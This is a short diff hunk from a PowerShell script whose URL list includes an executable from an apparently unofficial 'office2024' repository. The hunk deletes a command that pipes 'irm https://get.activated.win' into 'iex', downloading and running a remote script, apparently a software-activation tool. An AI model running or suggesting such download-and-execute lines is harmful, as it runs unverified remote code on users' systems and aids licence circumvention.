@@ -58,7 +58,3 @@ $urls = @(
     'https://github.com/Zigsaw07/office2024/raw/main/RAR.exe'
 )
 
-# PowerShell script to run the irm https://get.activated.win | iex command
-
-# Execute the command to download and run the script from the URL
-irm https://get.activated.win | iex
